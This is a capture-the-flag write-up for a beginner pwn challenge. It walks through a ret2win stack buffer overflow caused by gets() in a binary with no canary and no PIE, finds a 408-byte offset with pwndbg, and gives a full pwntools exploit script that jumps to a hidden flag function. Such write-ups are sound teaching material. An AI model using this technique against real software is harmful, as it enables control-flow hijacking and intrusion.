
As an elite hacker invited to an exclusive digital banquet, you must navigate through the layers of a complex software system. Among the appetizers, main course, and dessert lies a hidden entry point that, when discovered, reveals a treasure trove of sensitive information.

Author: @Inv1s1bl3
#pwn #easy #solved #gets #ret2win
`nc 34.125.199.248 4056`

![[vuln]]


### tools used:
[[gdb-pwndbg]]
[[ghidra]]
```
| RELRO         | STACK CANARY    | NX          | PIE    |
|---------------|-----------------|-------------|--------|
| Partial RELRO | No canary found | NX enabled  | No PIE |  
```

```
└─$ file vuln       
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=44e16aaded8b64d37e24983fe0184c3b97438a2b, for GNU/Linux 3.2.0, not stripped
```

The challenge title implies a buffer overflow - let's enter a spurious value to see what happens

```
└─$ ./vuln
Enter some text:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
zsh: segmentation fault  ./vuln
```

Great - buffer overflow with no canary. Let's have a look in ghidra to see what it looks like.

Looks like a ret2win challenge w/ no params:

```
undefined8
main(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,undefined8 param_5,
    undefined8 param_6)

{
  __gid_t __rgid;
  
  FUN_004010e0(stdout,0,2,0,param_5,param_6,param_2);
  __rgid = getegid();
  setregid(__rgid,__rgid);
  vuln();
  return 0;
```


There is a secret function which isn't used:

```
void secretFunction(void)

{
  puts("Congratulations!");
  puts("Flag: OSCTF{run_this_same_script_on_server}");
  return;
}

```

in [[gdb-pwndbg]] we can see:
```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401090  puts@plt
0x00000000004010a0  printf@plt
0x00000000004010b0  gets@plt
0x00000000004010c0  getegid@plt
0x00000000004010d0  setregid@plt
0x00000000004010e0  setvbuf@plt
0x00000000004010f0  _start
0x0000000000401120  _dl_relocate_static_pie
0x0000000000401130  deregister_tm_clones
0x0000000000401160  register_tm_clones
0x00000000004011a0  __do_global_dtors_aux
0x00000000004011d0  frame_dummy
0x00000000004011d6  secretFunction
0x00000000004011f9  vuln
0x000000000040124a  main
0x00000000004012b0  __libc_csu_init
0x0000000000401320  __libc_csu_fini
0x0000000000401328  _fini
```

Let's look at vuln in gdb and ghidra:

```
pwndbg> disassem vuln
Dump of assembler code for function vuln:
   0x00000000004011f9 <+0>:     endbr64
   0x00000000004011fd <+4>:     push   rbp
   0x00000000004011fe <+5>:     mov    rbp,rsp
   0x0000000000401201 <+8>:     sub    rsp,0x190
   0x0000000000401208 <+15>:    lea    rdi,[rip+0xe3d]        # 0x40204c
   0x000000000040120f <+22>:    call   0x401090 <puts@plt>
   0x0000000000401214 <+27>:    lea    rax,[rbp-0x190]
   0x000000000040121b <+34>:    mov    rdi,rax
   0x000000000040121e <+37>:    mov    eax,0x0
   0x0000000000401223 <+42>:    call   0x4010b0 <gets@plt>
   0x0000000000401228 <+47>:    lea    rax,[rbp-0x190]
   0x000000000040122f <+54>:    mov    rsi,rax
   0x0000000000401232 <+57>:    lea    rdi,[rip+0xe24]        # 0x40205d
   0x0000000000401239 <+64>:    mov    eax,0x0
   0x000000000040123e <+69>:    call   0x4010a0 <printf@plt>
   0x0000000000401243 <+74>:    mov    eax,0x0
   0x0000000000401248 <+79>:    leave
   0x0000000000401249 <+80>:    ret
```
```
undefined8 vuln(void)

{
  char local_198 [400];
  
  puts("Enter some text:");
  gets(local_198);
  printf("You entered: %s\n",local_198);
  return 0;
}
```
we can see that the vuln function uses the vulnerable gets() function to read the input to a buffer of 400 bytes. This has no bounds checking and will read as many chars as are input before a newline or it encounters EOF.

The aim here will be to hijack control by overflowing the return address to jump to the secret function which will print the flag. Let's check how many bytes we need to enter first to overwrite the return address using [[gdb-pwndbg]]:

When entering 500 bytes, we get a seg fault and the return address is overwritten with `0x6361616161616162`

`0x401249 <vuln+80>    ret                                <0x6361616161616162>

Let's check to see where that occurs:

```
pwndbg> cyclic -l 0x6361616161616162
Finding cyclic pattern of 8 bytes: b'baaaaaac' (hex: 0x6261616161616163)
Found at offset 408
```

That's as expected as the buffer is set to 400 bytes. If we input 408 bytes, the next address we overflow is the return address.

We can modify the pwntools official template:
```
from pwn import *
 

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
        if args.GDB:  # Set GDBscript below
                return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
        elif args.REMOTE:  # ('server', 'port')
                return remote(sys.argv[1], sys.argv[2], *a, **kw)
        else:  # Run locally
                return process([exe] + argv, *a, **kw)


# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# Pass in pattern_size, get back EIP/RIP offset
offset = 408

# Start program
io = start()  

# Build the payload
payload = flat( 
        b'a'* offset,
        elf.symbols.secretFunction
 
)

# Send the payload
io.sendlineafter(b':', payload)

# Got Shell?
io.interactive()

```

Running this against the server gives:

`Flag: OSCTF{buff3r_buff3t_w4s_e4sy!}`